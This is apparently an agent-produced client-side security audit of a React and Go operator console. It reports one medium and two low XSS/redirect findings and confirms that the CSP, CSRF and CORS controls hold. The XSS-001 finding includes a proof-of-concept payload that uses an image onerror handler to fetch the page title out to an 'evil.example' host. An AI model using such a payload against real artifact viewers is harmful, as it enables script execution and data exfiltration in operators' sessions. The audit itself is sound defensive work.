# AGEZT — Client-Side Security Findings (XSS / CSRF / CORS / Clickjacking / WebSocket / Open-Redirect)

> Domain: CLIENT-SIDE. Scope: `frontend/src` (React 19 + Vite SPA, go:embed-ded) and the Go control-plane web server in `kernel/webui` that serves it. node_modules / dist / `*.test.tsx` excluded except as corroborating context.
> Method: Discovery (grep for sinks) → Verify (read the sink + its mitigation in code/tests; judge real exploitability). Localhost-console-only risk is distinguished from internet-facing throughout.

## Executive summary

The client-side posture is **strong and clearly security-conscious**. The documented controls (strict CSP, SameSite=Strict cookies + Origin/Sec-Fetch CSRF gate, host allowlist, no CORS) were verified in code and largely hold. There is **no `dangerouslySetInnerHTML`/`innerHTML` in non-test frontend code**, the Markdown renderer is XSS-safe by construction, and there is **no `Access-Control-Allow-Origin` anywhere** in the Go tree (strict same-origin). No server-side WebSocket upgrade exists (only an outbound Nostr client), so no cross-site WebSocket-hijacking surface. The OAuth callback does not redirect and HTML-escapes reflected input. The one real residual is an **intentional sandboxed-iframe HTML-artifact preview** that runs agent/channel-influenced scripts in a null origin — isolated from the token, but still arbitrary JS execution in the operator's tab.

**Severity counts:** Critical 0 · High 0 · Medium 1 · Low 2 · Informational 3

---

## Findings

### XSS-001 — Agent/channel HTML artifacts rendered as live scripts in a sandboxed iframe
- **Severity:** Medium (localhost-console context) · **Confidence:** 70
- **CWE:** CWE-79 (Cross-site Scripting) / CWE-1021 (sandbox-escape adjacent)
- **File:** `frontend/src/views/Artifacts.tsx:394-402` (sink), data flow `:346`,`:359-361`
- **Description:** The artifact viewer fetches an HTML artifact's bytes as text and renders them with `<iframe srcDoc={text} sandbox="allow-scripts" ...>`. Artifact bytes are attacker-influenceable: artifacts originate from channel messages and agent/tool output (`entry.source`, `entry.sender` shown in the footer at `:329-330`). So a hostile channel/agent can store HTML containing `<script>` and have it execute when the operator opens the preview.
- **Why it is NOT critical:** the iframe is sandboxed **without `allow-same-origin`**, so scripts run in an **opaque/null origin**. They cannot read the parent's in-memory `TOKEN`, cookies, `localStorage`, or DOM, and cannot issue same-origin credentialed requests to `/api/*`. The page CSP (`default-src 'none'; script-src 'self'`) is also applied to the `srcdoc` document by modern browsers, which blocks inline `<script>` in the opaque origin as a second layer. The companion server route `/api/artifact/raw` independently refuses to serve `text/html` (forces `application/octet-stream`, `kernel/webui/artifact_route.go:65-76`, asserted by `artifact_route_test.go:38-39`), so *direct navigation* to the artifact is already neutralized — this finding is specifically the frontend's `srcdoc` re-injection that bypasses that content-type defense.
- **Residual risk:** even fully origin-isolated, `allow-scripts` permits arbitrary JS in the frame: outbound (uncredentialed) `fetch`/beacon exfil to an attacker host, convincing in-console **phishing UI** (fake "session expired, re-enter password" overlay), resource abuse, and browser-0-day surface — all triggered by merely viewing a malicious artifact in an authenticated session. The mitigation rests on two browser behaviors (sandbox origin isolation + CSP-on-srcdoc); the CSP layer in particular is not uniform across all engine versions.
- **PoC:** Cause an agent/channel to store an HTML artifact whose body is `<img src=x onerror="fetch('https://evil.example/x?'+document.title)">` (or an inline script if the engine doesn't apply parent CSP to srcdoc). Operator opens Artifacts → preview → JS runs in the sandbox.
- **Remediation (defense-in-depth):** (a) drop `allow-scripts` for the HTML preview and render sanitized static HTML, or route HTML artifacts through the existing safe `Markdown`/text path; (b) if live HTML must run, add an explicit per-frame `csp` attribute / `Content-Security-Policy: sandbox; default-src 'none'` and keep `allow-scripts` only behind an explicit "run scripts" operator click; (c) set `referrerpolicy="no-referrer"` and disallow `allow-popups`/`allow-top-navigation` (already absent — keep it that way).

---

### REDIR / XSS-002 — External-doc links not passed through `safeHref` (scheme allowlist gap)
- **Severity:** Low · **Confidence:** 40
- **CWE:** CWE-79 / CWE-601
- **Files:** `frontend/src/views/Channels.tsx:280` (`href={row.docs_url}`), `:644`; `frontend/src/views/ACPAgents.tsx:156` (`href={a.docs}`)
- **Description:** These anchors bind a backend-supplied URL directly into `href` without the project's own `safeHref()` scheme check (`frontend/src/lib/markdown.ts:38`) that the Markdown and Data.tsx bookmark paths correctly use. React does **not** strip `javascript:`/`data:` from `href`, so if a `docs_url`/`docs` value were ever attacker-controlled and began with `javascript:`, clicking it would execute. In practice these come from server-side channel/ACP **catalog config**, not free-form channel-message content, so exploitation requires control of the catalog — hence Low/low-confidence. It is flagged as an inconsistency: the codebase already has the right primitive and applies it everywhere else.
- **Remediation:** wrap with `safeHref(row.docs_url)` / `safeHref(a.docs)` and render plain text when it returns "" — matching `Data.tsx:616` and `Markdown.tsx:67`.

---

### XSS-003 — `window.open(authorize_url)` for OAuth without scheme validation
- **Severity:** Low · **Confidence:** 35
- **CWE:** CWE-79 / CWE-601
- **Files:** `frontend/src/views/Channels.tsx:182`, `frontend/src/views/Models.tsx:327`
- **Description:** `window.open(r.authorize_url, "_blank", "noopener,noreferrer")` opens a URL returned by `POST /api/channel/oauth/start`. `window.open("javascript:...")` can execute in some contexts. `authorize_url` is produced server-side from the channel/provider OAuth config (control-plane command `CmdChannelOAuthStart`), so it is not directly user-message-controlled; the `noopener,noreferrer` features are correctly set. Low risk, but the value is unvalidated client-side.
- **Remediation:** validate `r.authorize_url` is `https?:` before `window.open` (reuse `safeHref`); the daemon should likewise guarantee the provider authorize endpoint scheme.

---

### Verified-SAFE controls (informational — confirms the architecture claims)

**INFO-1 — Markdown rendering of agent/channel output is XSS-safe by construction.**
`frontend/src/lib/markdown.ts` + `frontend/src/components/Markdown.tsx`: a hand-rolled parser builds an AST whose leaves are rendered as **plain React children** (auto-escaped) — there is no raw-HTML path. `safeHref()` (`markdown.ts:38`) admits only `http(s)`/`mailto`, so `[x](javascript:…)` renders as inert text; links get `rel="noopener noreferrer nofollow"` + `target="_blank"`. This is the primary stored/DOM-XSS surface (LLM + untrusted channel content) and it is correctly closed. Other potentially-unsafe `href` sinks (`Data.tsx:616`) also use `safeHref`. CWE-79: mitigated.

**INFO-2 — CSP, clickjacking, and security headers are strict and correct.**
`kernel/webui/webui.go:1085-1100` sets on **every** route (before auth, so even 401s carry them): `default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self' data:; font-src 'self' data:; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`, plus `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer` (keeps the `?token=` out of Referer), `X-Content-Type-Options: nosniff`. No inline-script allowance, no `unsafe-eval`. `'unsafe-inline'` is on `style-src` only (Radix/React-Flow runtime styles) — no code execution. Clickjacking (CWE-1021): mitigated by both `frame-ancestors 'none'` and `X-Frame-Options: DENY`.

**INFO-3 — CSRF defense holds; no CORS exposure.**
Auth is primarily Bearer token held in memory (`lib/api.ts:7-21`, from `?token=`, never in localStorage) → token-mode is structurally CSRF-immune (no ambient credential). Password-session mode uses a cookie that is `HttpOnly; SameSite=Strict; Secure(proxy-aware)` (`kernel/webui/session.go:211-219`) — SameSite=Strict means the cookie is never attached on cross-site requests, defeating CSRF independently. On top of that, `sameOriginMutation` (`webui.go:1117-1134`) rejects state-changing methods whose `Sec-Fetch-Site: cross-site` or whose `Origin` host ≠ `Host`. (Note: an empty `Origin` + missing Sec-Fetch on a cross-site form POST passes that gate, but the SameSite=Strict cookie won't be sent, so the 272 state-changing routes are not reachable cross-site with credentials.) **No `Access-Control-Allow-Origin`/`-Allow-Credentials` exists anywhere in the Go tree** → no origin reflection, no wildcard-with-credentials. CWE-352 / CWE-942: mitigated. Constant-time token/password compare + login lockout present.

**Additional verified-safe (no separate INFO block):**
- **WebSocket (CWE-1385/CWE-306):** no server-side `websocket.Accept`/upgrader exists; the only `coder/websocket` use is an **outbound** `websocket.Dial` in `plugins/channels/nostr/nostr.go:156`. Live UI streaming is SSE (`/events`, token-gated; `?token=` allowed only because EventSource can't set headers, and Referrer-Policy hides it). No cross-site WebSocket-hijacking surface.
- **Open redirect (CWE-601):** `handleOAuthCallback` (`webui.go:675-696`) performs **no** `http.Redirect` with user input — it renders a self-closing terminal page. Reflected `error`/error-message strings are HTML-escaped via `htmlEscape` (`webui.go:705`,`715-718`) before injection into `<title>`/`<p>` **text** contexts (single-quote is not escaped, but it is not an attribute context, so that is safe here). No `Location:`-from-input anywhere.
- **Artifact raw endpoint (`/api/artifact/raw`):** forces a safe Content-Type allowlist, downgrades `text/html`→`application/octet-stream`, and wraps SVG in a `sandbox` CSP (`artifact_route.go:41-51,65-76`) — direct-navigation stored XSS is closed. (The only bypass is the frontend `srcdoc` re-injection — XSS-001.)
- **External links** (`Channels`, `ACPAgents`, `QuickConnect`) use `rel="noreferrer"` (implies noopener) → no reverse-tabnabbing; `providerPresets.ts` URLs are static `https://` (test-enforced `providerPresets.test.ts:15`).

---

## Notes for the orchestrator
- The single actionable client-side item is **XSS-001** (Medium): sandboxed-but-script-enabled HTML artifact preview. It is an *intentional* design choice (explicit code comment) whose isolation depends on two browser behaviors; recommend tightening to defense-in-depth (no `allow-scripts`, or explicit per-frame CSP behind an operator gate).
- XSS-002 / XSS-003 are low-confidence consistency fixes (apply existing `safeHref` to backend-supplied URLs).
- The CSP/CSRF/host-allowlist/no-CORS architecture claims were verified true in code, not merely trusted from the doc. This is a localhost-first operator console; nothing here is a remote-unauthenticated client-side hole.
